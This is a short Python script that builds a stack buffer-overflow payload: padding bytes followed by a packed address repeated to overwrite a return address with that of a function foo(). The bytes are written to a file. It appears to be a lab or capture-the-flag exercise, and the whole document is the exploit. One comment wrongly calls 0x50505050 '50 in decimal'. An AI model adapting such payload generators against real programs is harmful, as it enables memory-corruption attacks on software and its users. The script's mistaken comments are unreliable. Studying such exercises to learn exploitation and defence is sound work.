import struct

# Change the buffer_size and foo_address according to your environment
buffer_size = 4
foo_address = 0x50505050   # assuming foo() address is 50 in decimal

# Convert the foo_address to hexadecimal format
foo_address_hex = hex(foo_address)

# Fill the buffer with junk data
payload = b'A' * buffer_size

# Overwrite the return address with the address of foo()
for i in range(30):
    payload += struct.pack('<I', int(foo_address_hex, 16))

# Write the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)